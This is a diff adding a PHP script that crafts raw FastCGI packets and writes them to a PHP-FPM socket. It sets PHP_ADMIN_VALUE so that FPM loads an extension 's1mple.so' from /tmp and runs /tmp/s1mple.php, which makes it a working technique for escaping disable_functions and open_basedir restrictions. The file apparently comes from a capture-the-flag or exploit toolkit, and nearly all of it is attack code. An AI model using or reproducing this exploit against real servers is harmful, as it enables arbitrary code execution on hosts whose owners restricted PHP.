@@ -1,0 +1,113 @@
+<?php 
+class Client
+{
+    const VERSION_1            = 1;
+    const BEGIN_REQUEST        = 1;
+    const PARAMS               = 4;
+    const STDIN                = 5;
+    const RESPONDER            = 1;
+    protected $keepAlive = false;
+    protected $_requests = array();
+    protected $_requestCounter = 0;
+    protected function buildPacket($type, $content, $requestId = 1)
+    {
+        $offset = 0;
+        $totLen = strlen($content);
+        $buf    = '';
+        do {
+            $part = substr($content, $offset, 0xffff - 8);
+            echo $part;
+            $segLen = strlen($part);
+            $buf .= chr(self::VERSION_1)        
+                . chr($type)                    
+                . chr(($requestId >> 8) & 0xFF) 
+                . chr($requestId & 0xFF)        
+                . chr(($segLen >> 8) & 0xFF)    
+                . chr($segLen & 0xFF)           
+                . chr(0)                        
+                . chr(0)                        
+                . $part;                        
+            $offset += $segLen;
+        } while ($offset < $totLen);
+        return $buf;
+    }
+    protected function buildNvpair($name, $value)
+    {
+        $nlen = strlen($name);
+        $vlen = strlen($value);
+        if ($nlen < 128) {
+            $nvpair = chr($nlen);
+        } else {
+            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
+        }
+        if ($vlen < 128) {
+            $nvpair .= chr($vlen);
+        } else {
+            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
+        }
+        return $nvpair . $name . $value;
+    }
+    protected function readNvpair($data, $length = null)
+    {
+        if ($length === null) {
+            $length = strlen($data);
+        }
+        $array = array();
+        $p = 0;
+        while ($p != $length) {
+            $nlen = ord($data{$p++});
+            if ($nlen >= 128) {
+                $nlen = ($nlen & 0x7F << 24);
+                $nlen |= (ord($data{$p++}) << 16);
+                $nlen |= (ord($data{$p++}) << 8);
+                $nlen |= (ord($data{$p++}));
+            }
+            $vlen = ord($data{$p++});
+            if ($vlen >= 128) {
+                $vlen = ($nlen & 0x7F << 24);
+                $vlen |= (ord($data{$p++}) << 16);
+                $vlen |= (ord($data{$p++}) << 8);
+                $vlen |= (ord($data{$p++}));
+            }
+            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
+            $p += ($nlen + $vlen);
+        }
+        return $array;
+    }
+    public function buildAllPacket(array $params, $stdin)
+    {
+        do {
+            $this->_requestCounter++;
+            if ($this->_requestCounter >= 65536) {
+                $this->_requestCounter = 1;
+            }
+            $id = $this->_requestCounter;
+        } while (isset($this->_requests[$id]));
+        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->keepAlive) . str_repeat(chr(0), 5), $id);
+        $paramsRequest = '';
+        foreach ($params as $key => $value) {
+            $paramsRequest .= $this->buildNvpair($key, $value, $id);
+        }
+        if ($paramsRequest) {
+            $request .= $this->buildPacket(self::PARAMS, $paramsRequest, $id);
+        }
+        $request .= $this->buildPacket(self::PARAMS, '', $id);
+        if ($stdin) {
+            $request .= $this->buildPacket(self::STDIN, $stdin, $id);
+        }
+        $request .= $this->buildPacket(self::STDIN, '', $id);
+        
+        return $request;
+    }
+}
+$sock = stream_socket_client("the_way_to_the_fpm", $errno, $errstr);
+$client = new Client();
+$payload_file = "/tmp/s1mple.php";
+$params = array('REQUEST_METHOD' => 'GET',
+            'SCRIPT_FILENAME' => $payload_file,
+            'PHP_ADMIN_VALUE' => "extension_dir = /tmp\nextension = s1mple.so",
+);
+$data = $client->buildAllPacket($params, '');
+fwrite($sock, $data);
+var_dump(fread($sock, 4096));
+?>
